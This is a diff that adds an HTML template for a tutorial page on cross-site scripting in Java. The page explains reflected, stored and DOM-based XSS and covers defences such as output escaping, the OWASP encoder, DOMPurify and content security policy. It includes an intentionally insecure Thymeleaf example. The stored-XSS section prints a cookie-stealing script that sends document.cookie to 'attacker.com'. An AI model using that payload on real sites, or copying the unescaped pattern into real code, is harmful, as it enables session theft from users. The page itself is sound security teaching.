@@ -1,0 +1,191 @@
+{% extends "base.html" %}
+
+{% block title %}
+    Cross-site scripting |
+{% endblock %}
+
+{% block content %}
+    <br>
+    <div class="col-xs-12 col-sm-8 col-md-8 col-lg-8">
+        <div class="articles" id="xss-injection">
+            <h2>Cross-site scripting</h2>
+            <p>Another common vulnerability in Java is cross-site scripting or XSS. 
+                It is also a type of injection attack. In this type of attack, the hacker 
+                exploits website vulnerabilities by injecting malicious client-side scripts 
+                that are later executed by the website users. Cross-site scripting does not have a direct 
+                impact on the web server which differentiates this vulnerability from most other common web 
+                vulnerabilities. Victims of XSS attacks are regular users of the hacked web application.
+            </p>
+            <p>A successful XSS attack may have severe consequences like account impersonation, identity theft,
+                and theft of sensitive data such as passwords, healthcare reports or banking information. 
+                The hacker can also use XSS to spread worms on social media sites, perform denial of service attacks,
+                mine cryptocurrency on the victim's computer and carry out website vandalism.
+            </p>
+            <p>Cross-site scripting is so common it used to have its own separate category in the OWASP Top 10.
+                Currently, it is part of OWASP Top 10 A3:2021 category - injection together with SQL injection.</p>
+            
+            <h3>Simple Example in Java</h3>
+            <p>This is a basic example of a cross-scripting attack with the assistance of a query parameter.
+                For this purpose consider the following Spring Boot code displays 
+                "Hello, {name}!" where {name} is an input parameter:</p>
+            <pre>
+                <code class="language-java">
+                    package com.example.demo;
+                    import org.springframework.stereotype.Controller;
+                    import org.springframework.ui.Model;
+                    import org.springframework.web.bind.annotation.GetMapping;
+                    import org.springframework.web.bind.annotation.RequestParam;
+                    
+                    @Controller
+                    public class GreetingController {
+                        @GetMapping("/greeting")
+                        public String index(@RequestParam(name="name",
+                        required=true) String name, Model model) {
+                            model.addAttribute("name", name);
+                            return "greeting";
+                        }
+                    }
+                </code>
+            </pre>
+            <p>The controller defines an index action method, which is mapped to the <code>/greeting</code> route. 
+                The method defines a required string parameter called name and then adds the received 
+                value as an attribute to the model.
+            </p>
+            
+            <pre>
+                <code class="language-java">
+                    &lt;!DOCTYPE HTML&gt;
+                    &lt;html xmlns:th="http://www.thymeleaf.org"&gt;
+                    &lt;head&gt;
+                        &lt;title&gt;Getting Started: Serving Web Content&lt;/title&gt;&nbsp;
+                        &lt;meta http-equiv="Content-Type" 
+                        content="text/html; charset=UTF-8" /&gt;
+                    &lt;/head&gt;
+                    &lt;body&gt;
+                        &lt;p th:utext="'Hello, ' + ${name} + '!'" /&gt;
+                    &lt;/body&gt;
+                    &lt;/html&gt;
+                </code>
+            </pre>
+            
+            <p>The user passes the value of the name variable as a query parameter, 
+                that gets concatenated to a message that is displayed inside a tag.
+            </p>
+            <p>If the hacker types in <code>&lt;script&gt;/*some_malicious_script*/&lt;/script&gt;</code> 
+                as an input parameter, he will be able to run this potentially harmful 
+                script because the code is insecure.
+            </p>
+            <p>To prevent this type of reflective cross-scripting attack it is important
+                to escape user input. The example above is intentionally insecure. 
+                The Thymeleaf templating engine used to display the greeting uses the <code>utext</code>
+                attribute processor, which stands for unescaped text. Changing it to attribute text removes this
+                specific vulnerability. Now if the hacker tries to type in 
+                <code>&lt;script&gt;/*some_malicious_script*/&lt;/script&gt;</code> as an input the application 
+                will display it as <code>"Hello, &lt;script&gt;/*some_malicious_script*/&lt;/script&gt;!"</code> instead.
+            </p>
+            <p>Most mature frameworks like Spring have built-in security features that should be able to protect 
+                applications against the most common types of attacks.</p>
+            
+            <br>
+            <h3>Types of XSS</h3>
+            <p>There are 3 primary types of cross-site scripting:</p>
+            <h4>Reflected XSS (non-persistent)</h4>
+            <p>Reflected or non-persistent XSS attacks are considered to be the simplest form of XSS attack.
+                It occurs when an attacker sends a malicious script - usually in a URL to the user, 
+                the user clicks on the URL, and the user's browser executes the attack. This type of XSS 
+                is very popular for stealing personal information from the user.</p>
+            
+            <h5>Simple example of reflected XSS</h5>
+            <p> <code>http://insecure-application.com/search?q=amisecure</code> </p>
+            <p> <code>&lt;p&gt;Search Term: amisecure&lt;/p&gt;</code> </p>
+            
+            
+            <p>An attacker may try to execute a reflected XSS attack that looks like this:</p>
+            <p> <code>http://insecure-application.com/search?q=&lt;script&gt;/*some_malicious_script*/&lt;/script&gt;</code> </p>
+            <p> <code>&lt;p&gt;Search Term: &lt;script&gt;/*some_malicious_script*/&lt;/script&gt;&lt;/p&gt;</code> </p>
+            
+            <p>When a user visits this URL, then the hacker's malicious script will run in the user's browser, 
+                giving him access to the user's information and to act as the user.</p>
+            
+            <h4>Stored XSS (persistent)</h4>
+            <p>A stored or persistent XSS attack occurs when an attacker sends a malicious script to 
+                a vulnerable application. The application saves (stores) the malicious script 
+                on the target server, such as in its database, visitor log, comment field or 
+                other server-side text files. The script is later sent to the victim's browser 
+                and executed when the victim visits the webpage.</p>
+            
+            <h5>Simple example of stored XSS</h5>
+            <p>Imagine an application that has a feature that lets users post comments but doesn't process the posted data.</p>
+            <p> <code>&lt;p&gt;Hello! This is my comment!&lt;/p&gt;</code> </p>
+            <p>An attacker can exploit this vulnerability by posting a comment like this:</p>
+             <p> <code>&lt;script&gt;window.location='http://attacker.com/?cookie='+document.cookie &lt;/script&gt;</code> </p>
+            <p> This example would send a POST request to the web application which would be stored in the application 
+                database as a comment. Later when the victim uses the application, the comment is then interpreted 
+                as a script and sends the victim's cookie to the attacker.
+            </p>
+            
+            <h4>DOM-based</h4>
+            <p>DOM-based XSS occurs when an application saves untrusted data and uses it to modify
+                the document object model (DOM) used by the client-side script. The page itself remains
+                unchanged but the client code will be executed differently because of the changed DOM. 
+                This type of XSS is entirely client-side based because the payload never reaches the server.
+            </p>
+            <h5>Example</h5>
+            <p>In this example application uses JavaScript to read a value from input and write it to an element in HTML:</p>
+            <pre>
+                <code class="language-javascript">
+                    var search = document.getElementById('search').value;
+                    var results = document.getElementById('results');
+                    results.innerHTML = 'You searched for: ' + search;
+                </code>
+            </pre>
+            <p>The attacker can create a malicious input that executes their script:</p>
+            <p>You searched for: <code>&lt;img src=1 onerror='/* malicious script */'&gt;</code> </p>
+            
+            <h3>Prevention</h3>
+            <p>One of the reasons cross-site scripting is so common is that it is difficult to prevent it.
+                This subsection will describe defensive methods to prevent or at least limit the impact of XSS.
+            </p>
+            <p>One such technique is filtering input. Passing all user input through a filter is a simple way 
+                to decrease the number of XSS vulnerabilities. Filters should be as strict as possible and 
+                remove dangerous keywords, for instance &lt;script&gt; tag and other potentially vulnerable 
+                HTML elements, JavaScript commands, and CSS styles. Filtering should be used only in simple cases 
+                otherwise it may lead to undesired side effects such as by filtering out legitimate content.
+            </p>
+            <p>Another way to mitigate XSS attacks is by escaping dynamic content. This method causes all data 
+                typed by the user to be interpreted as text instead of code. Escaping dynamic content usually 
+                involves replacing characters by encoding. The type of encoding depends on the output context 
+                because browsers parse HTML, CSS, JavaScript and URLs differently. For example, for HTML content 
+                unauthorized values should be converted into HTML entity encoding and for JavaScript all 
+                non-alphanumeric values should be Unicode-escaped. Using the incorrect escaping method could 
+                lead to vulnerabilities in the application. Most modern frameworks are escaping dynamic content by default.
+            </p>
+            <p>For Java programmers, there are tools developed by OWASP which are focused on protection 
+                against cross-site scripting. The OWASP Enterprise Security API (ESAPI) is a web 
+                application security control library that includes more than just XSS protection but
+                is currently not well-maintained. OWASP Java encoder has similar functionality to ESAPI's
+                encoder and it is recommended to use it instead.
+            </p>
+            <ul class="bullet-list">Other methods of cross-site scripting prevention are:
+                <li>Sanitization of HTML – When an application needs to store and render raw HTML, 
+                    developers should use an HTML sanitization library, like DOMPurify which is recommended by OWASP,
+                    to strip dangerous content from a variable and return a safe string of HTML</li>
+                <li>Using appropriate response headers like Content-Type or X-Content-Type-Options to ensure that 
+                    the browser interprets the values correctly.
+                </li>
+                <li>Restricting input values to allow only known valid ones when possible,
+                    such as using drop-down lists or datepickers.
+                </li>
+                <li>Implementing a content security policy that allows the developer to control where
+                    JavaScript can be loaded and executed.
+                </li>
+            </ul>
+            <p></p>
+            <p></p>
+            <p></p>
+            <p></p>
+            <p></p>
+            <br><br>
+        </div>
+    </div>
+{% endblock %}
